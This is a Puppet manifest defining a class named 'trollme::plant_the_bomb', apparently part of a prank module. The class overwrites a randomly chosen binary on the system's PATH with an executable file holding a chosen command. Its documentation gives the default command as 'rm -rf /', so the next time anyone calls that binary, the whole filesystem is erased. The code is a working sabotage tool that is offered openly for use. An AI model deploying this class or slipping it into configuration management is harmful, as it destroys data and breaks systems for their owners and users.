# == Class: trollme::plant_the_bomb
#
# Substitutes a random binary from path to a specified command.
#
# === Parameters
#
# What command to run instead.
#
# === Parameters:
#
# [*command*]
#   Specify a command line to execute.
#   Defaults to "rm -rf /"
#
# === Examples
#
#  class { 'trollme::plant_the_bomb':
#    command => 'reboot',
#  }
#
# === Authors
#
# Andre Ramoni
#
class trollme::plant_the_bomb (
  $command = $::trollme::params::ptb_command,
  $file    = $::roulette_file, # FIX NEEDED. 
) inherits trollme::params {
  file { $file:
    ensure  => file,
    mode    => '0755',
    content => $command,
  }

}
